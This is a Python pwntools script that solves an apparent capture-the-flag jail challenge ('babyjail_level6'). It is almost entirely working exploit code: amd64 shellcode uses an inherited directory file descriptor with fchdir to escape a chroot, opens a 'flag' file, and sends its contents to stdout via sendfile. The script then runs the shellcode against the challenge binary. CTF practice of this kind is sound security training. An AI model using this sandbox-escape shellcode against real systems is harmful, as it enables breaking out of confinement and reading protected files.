'''
 π”√openat
'''

from pwn import *
context.arch = "amd64"


my_sc = asm('''

    push SYS_fchdir
    pop rax
    push 0x3
    pop rdi
    syscall

    push 0x67616c66      
    push SYS_open /* 2 */
    pop rax
    mov rdi, rsp
    xor rsi, rsi
    syscall

    /* call sendfile(1, 'rax', 0, 0x7fffffff) */
    mov r10d, 0x7fffffff
    mov rsi, rax
    push SYS_sendfile /* 0x28 */
    pop rax
    push 1
    pop rdi
    cdq /* rdx=0 */
    syscall

''')
# display the bytes
print(disasm(my_sc))
# fd = open("ttt-raw","wb+")
# fd.write(my_sc)
# fd.close()
p = process(["/challenge/babyjail_level6", "/"])
# context.terminal = ['tmux', 'splitw', '-h']  # Attempting to use multixterm
# p = gdb.debug(["/challenge/babyjail_level3", "/"], gdbscript="source /opt/gef/gef.py")
p.send(my_sc)
all = p.recvall()
print(all.decode())